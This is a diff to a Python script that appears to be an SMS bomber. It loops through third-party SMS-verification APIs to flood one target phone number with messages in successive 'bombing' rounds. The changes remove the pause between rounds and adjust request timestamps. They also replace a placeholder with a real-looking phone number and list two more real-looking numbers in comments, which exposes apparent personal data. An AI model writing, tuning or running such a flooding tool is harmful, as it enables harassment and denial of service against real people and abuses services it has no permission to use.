@@ -87,7 +87,7 @@ def sendSMS(API, phone):
     }
     if API.get('headers'):
         headers.update(API.get('headers'))
-    url = API.get('url').replace("手机号码", phone).replace("时间1", str(int(time.time() * 1000))).replace("时间2", str(int(time.time() * 1000)))
+    url = API.get('url').replace("手机号码", phone).replace("时间1", str(int(time.time()))).replace("时间2", str(int(time.time())))
     body = API.get('body')
     try:
         if body:
@@ -109,12 +109,14 @@ def main(phone):
             sendSMS(API, phone)
             # time.sleep(random.randint(1, 3))
             time.sleep(0)
-        print(f"{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())} 第{i}轮轰炸完成！等待60秒后，开始第{i+1}轮轰炸！")
+        print(f"{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())} 第{i}轮轰炸完成！等待0秒后，开始第{i+1}轮轰炸！")
         time.sleep(0)
         i += 1
 
 if __name__ == '__main__':
     # 手机号
-    phone = '185xxxxxxxx'
+    phone = '18563402200'
+    # phone = '15169171993'
+    # phone = '13863454314'
     # sendSMS(APIS[-1], phone)
     main(phone)
